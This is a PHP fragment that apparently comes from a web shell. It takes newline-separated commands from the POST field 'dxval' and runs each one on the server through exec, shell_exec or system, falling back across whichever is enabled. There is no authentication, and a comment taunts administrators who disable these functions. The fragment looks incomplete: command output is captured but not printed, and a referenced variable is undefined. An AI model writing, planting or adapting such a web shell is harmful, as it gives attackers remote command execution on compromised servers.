<?php
function DxExecNahuj($cmd, &$OUT, &$RET) /* returns the name of function that exists, or FALSE */
{
$OUT=array(); 
$RET='';
if (function_exists('exec'))
{
	exec($cmd, $OUT, $RET); /* full array output */
	return array(true,true,'exec', '');
}
elseif  (function_exists('shell_exec'))
{
	$OUT[0]=shell_exec($cmd); /* full string output, no RETURN */
	return array(true,false,'shell_exec', '<s>exec</s> shell_exec');
}
elseif  (function_exists('system'))
{
	$OUT[0]=system($cmd, $RET); /* last line of output */
	return array(true,false,'system', '<s>exec</s> <s>shell_exec</s> system<br>Only last line of output is available, sorry =(');
}
else 
	return array(FALSE, FALSE, '&lt;noone&gt;', '<s>exec</s> <s>shell_exec</s> <s>system</s> Bitchy admin has disabled command line!! =(');;
}


$_POST['dxval']=split("\n", str_replace("\r", '', $_POST['dxval']));
for ($i=0; $i<count($_POST['dxval']); $i++)
{
	$CUR=$_POST['dxval'][$i];
	if (empty($CUR)) 
		continue;

	DxExecNahuj($CUR,$OUT, $RET);
	print str_repeat("\n", 10).'<!--'.$warnstr[2].'("'.$CUR.'")-->'."\n\n".'<table border=0 width=100%><tr><td class=listing>'."\n\n";

	print str_repeat("\n", 10).'<!--/'.$warnstr[2].'("'.$CUR.'")-->'."\n\n".'</td></tr></table>';
}

?>